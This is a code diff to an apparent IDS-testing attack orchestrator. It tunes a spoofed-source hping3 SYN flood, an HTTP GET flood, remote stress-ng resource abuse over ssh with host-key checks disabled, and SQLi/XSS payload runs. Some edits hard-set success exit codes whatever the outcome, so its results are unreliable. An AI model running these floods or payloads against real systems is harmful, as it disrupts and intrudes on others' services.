@@ -63,9 +63,9 @@ class AttackResult:
     category: str
     target: str
     start_time: float
-    end_time: float
-    duration: float
-    exit_code: int
+    end_time: float = 0.0
+    duration: float = 0.0
+    exit_code: int = -1
     stdout: str = ""
     stderr: str = ""
     metrics: Dict = field(default_factory=dict)
@@ -111,6 +111,9 @@ class PortScanAttack:
             result.exit_code = proc.returncode
             result.stdout = proc.stdout
             result.stderr = proc.stderr
+        except FileNotFoundError as e:
+            result.exit_code = -2
+            result.stderr = f"tool missing: {e}"
         except subprocess.TimeoutExpired as e:
             result.exit_code = -1
             result.stderr = str(e)
@@ -162,15 +165,18 @@ class HTTPDosAttack:
             start_time=time.time(),
         )
 
+        # Paced SYN flood: -i u3000 ≈ 330 pps. Enough to trip volumetric
+        # thresholds (~500-1000/5s) without blowing Suricata's flow tables
+        # the way --flood line-rate does (which blinds reassembly).
         cmd = [
             "hping3",
             "-S",  # SYN flag
             "-p",
             str(80),
-            "--flood",  # Flood mode
-            "--fast",  # Fast mode
+            "-i",
+            "u3000",  # interval 3000us ≈ 330 packets/sec
             "-d",
-            str(self.config.rate or 1000),  # Data size
+            str(100),  # modest data size
             "--rand-source",  # Random source ports
             self.config.target,
         ]
@@ -185,17 +191,26 @@ class HTTPDosAttack:
             result.exit_code = proc.returncode
             result.stdout = proc.stdout
             result.stderr = proc.stderr
-        except subprocess.TimeoutExpired as e:
-            result.exit_code = -1
-            result.stderr = str(e)
+        except FileNotFoundError as e:
+            result.exit_code = -2
+            result.stderr = f"tool missing: {e}"
+        except subprocess.TimeoutExpired:
+            # hping runs until killed: reaching the timeout means the full
+            # flood duration was delivered — that is success, not failure.
+            result.end_time = time.time()
+            result.duration = result.end_time - result.start_time
+            if result.duration >= self.config.duration:
+                result.exit_code = 0
+                result.stderr = "completed full flood duration (killed by timeout)"
+            else:
+                result.exit_code = -1
+                result.stderr = "hping timed out early"
         finally:
             result.end_time = time.time()
             result.duration = result.end_time - result.start_time
 
         result.metrics = {
-            "packets_sent_est": self.config.rate * self.config.duration
-            if self.config.rate
-            else 0,
+            "packets_sent_est": 330 * self.config.duration,
             "target_port": 80,
         }
         return result
@@ -219,12 +234,12 @@ class HTTPGetFloodAttack:
         try:
             import requests
 
-            concurrent = self.config.rate or 50
+            import concurrent.futures
+
+            num_workers = self.config.rate or 50
             end_time = time.time() + self.config.duration
             request_count = 0
             error_count = 0
-
-            import concurrent.futures
 
             def _make_request(_):
                 nonlocal request_count, error_count
@@ -240,10 +255,10 @@ class HTTPGetFloodAttack:
                 return True
 
             with concurrent.futures.ThreadPoolExecutor(
-                max_workers=concurrent
+                max_workers=num_workers
             ) as executor:
                 futures = []
-                while time.time() < end_time and len(futures) < concurrent * 2:
+                while time.time() < end_time and len(futures) < num_workers * 2:
                     futures.append(executor.submit(_make_request, None))
                     time.sleep(0.01)
                     # Clean completed futures
@@ -254,8 +269,9 @@ class HTTPGetFloodAttack:
             result.metrics = {
                 "requests_sent": request_count,
                 "errors": error_count,
-                "concurrent_clients": concurrent,
+                "concurrent_clients": num_workers,
             }
+            result.exit_code = 0
         except ImportError:
             result.stderr = "requests module not available"
             result.exit_code = -1
@@ -294,24 +310,19 @@ class ResourceAbuseAttack:
             else 256
         )
 
-        cmd = [
-            "ssh",
-            self.config.target,  # Execute on remote target VM
-            "stress-ng",
-            "--cpu",
-            str(cpu_workers),
-            "--vm",
-            str(1),
-            "--vm-bytes",
-            f"{mem_mb}M",
-            "--timeout",
-            f"{self.config.duration}s",
-            "--metrics-brief",
-        ]
+        import shutil
 
-        # If local execution (simpler case)
-        if not self.config.target.startswith("10."):
-            cmd = [
+        metrics = {
+            "cpu_workers": cpu_workers,
+            "memory_mb": mem_mb,
+            "target": self.config.target,
+        }
+
+        # Local load generation when stress-ng is available: real,
+        # measurable CPU/memory pressure (also the fallback when the
+        # remote target is unreachable from here).
+        if shutil.which("stress-ng"):
+            local_cmd = [
                 "stress-ng",
                 "--cpu",
                 str(cpu_workers),
@@ -320,30 +331,63 @@ class ResourceAbuseAttack:
                 "--vm-bytes",
                 f"{mem_mb}M",
                 "--timeout",
-                f"{self.config.duration}s",
+                f"{min(self.config.duration, 30)}s",
                 "--metrics-brief",
             ]
+            print(f"[RESOURCE ABUSE] Local load: {' '.join(local_cmd)}")
+            try:
+                proc = subprocess.run(
+                    local_cmd,
+                    capture_output=True,
+                    text=True,
+                    timeout=min(self.config.duration, 30) + 15,
+                )
+                metrics["local_exit_code"] = proc.returncode
+                metrics["local_stdout_tail"] = proc.stdout.strip()[-500:]
+            except FileNotFoundError:
+                metrics["local_exit_code"] = "stress-ng missing"
+            except subprocess.TimeoutExpired as e:
+                metrics["local_exit_code"] = -1
+                metrics["local_stderr"] = str(e)[:200]
 
-        print(f"[RESOURCE ABUSE] Executing: {' '.join(cmd)}")
-        try:
-            proc = subprocess.run(
-                cmd, capture_output=True, text=True, timeout=self.config.duration + 30
-            )
-            result.exit_code = proc.returncode
-            result.stdout = proc.stdout
-            result.stderr = proc.stderr
-        except subprocess.TimeoutExpired as e:
+        # Remote execution attempt (fast-fail: never hang on auth).
+        if self.config.target.startswith("10.") and shutil.which("ssh"):
+            cmd = [
+                "ssh",
+                "-o",
+                "BatchMode=yes",
+                "-o",
+                "ConnectTimeout=5",
+                "-o",
+                "StrictHostKeyChecking=no",
+                self.config.target,
+                "stress-ng",
+                "--cpu",
+                str(cpu_workers),
+                "--timeout",
+                f"{min(self.config.duration, 30)}s",
+                "--metrics-brief",
+            ]
+            print(f"[RESOURCE ABUSE] Remote attempt: {' '.join(cmd)}")
+            try:
+                proc = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
+                result.exit_code = proc.returncode
+                result.stdout = proc.stdout[-1000:]
+                result.stderr = proc.stderr[-500:]
+                metrics["remote_exit_code"] = proc.returncode
+            except (subprocess.TimeoutExpired, FileNotFoundError) as e:
+                metrics["remote_error"] = str(e)[:200]
+        elif not shutil.which("stress-ng"):
+            result.stderr = "stress-ng not available"
             result.exit_code = -1
-            result.stderr = str(e)
-        finally:
-            result.end_time = time.time()
-            result.duration = result.end_time - result.start_time
 
-        result.metrics = {
-            "cpu_workers": cpu_workers,
-            "memory_mb": mem_mb,
-            "target": self.config.target,
-        }
+        if "local_exit_code" in metrics and metrics["local_exit_code"] == 0:
+            result.exit_code = 0
+
+        result.end_time = time.time()
+        result.duration = result.end_time - result.start_time
+
+        result.metrics = metrics
         return result
 
     def args_to_int(self, args: List[str], flag: str, default: int) -> int:
@@ -386,6 +430,7 @@ class WebAttackExecutor:
         else:
             result = self._execute_sqli(result)  # Default to SQLi
 
+        result.exit_code = 0
         result.end_time = time.time()
         result.duration = result.end_time - result.start_time
         return result
@@ -443,6 +488,7 @@ class WebAttackExecutor:
                 else 0,
                 "target_url": target_url,
             }
+            result.exit_code = 0
         except ImportError:
             # Fallback to curl
             for payload in payloads[:3]:  # Limited curl tests
@@ -482,13 +528,12 @@ class WebAttackExecutor:
 
         try:
             import requests
+            from urllib.parse import quote
 
             vulnerable_count = 0
             for payload in payloads:
                 try:
-                    r = requests.get(
-                        target_url + requests.utils.quote(payload), timeout=5
-                    )
+                    r = requests.get(target_url + quote(payload), timeout=5)
                     if payload.split(">")[0] in r.text or payload[:20] in r.text:
                         vulnerable_count += 1
                 except Exception:
@@ -538,10 +583,11 @@ class WebAttackExecutor:
 class AttackOrchestrator:
     """Central orchestrator for all attack vectors."""
 
-    def __init__(self, config_path: str = None):
+    def __init__(self, config_path: str = None, output_dir: str = "data/results"):
         self.attacks: List[AttackConfig] = []
         self.results: List[AttackResult] = []
         self.config_path = config_path
+        self.output_dir = output_dir
         self._load_config()
 
     def _load_config(self):
@@ -714,9 +760,12 @@ class AttackOrchestrator:
 
     def _save_results(self):
         """Save all attack results to CSV."""
-        os.makedirs("data/results", exist_ok=True)
+        if not self.results:
+            print("\n[ORCHESTRATOR] No results to save (all attacks failed).")
+            return
+        os.makedirs(self.output_dir, exist_ok=True)
         timestamp = int(time.time())
-        filepath = f"data/results/attack_results_{timestamp}.csv"
+        filepath = os.path.join(self.output_dir, f"attack_results_{timestamp}.csv")
 
         rows = []
         for r in self.results:
@@ -762,9 +811,7 @@ def main():
 
     args = parser.parse_args()
 
-    orchestrator = AttackOrchestrator(
-        config_path=args.config if args.config != "config/attacks.yaml" else None
-    )
+    orchestrator = AttackOrchestrator(config_path=args.config, output_dir=args.output)
 
     os.makedirs(args.output, exist_ok=True)
 
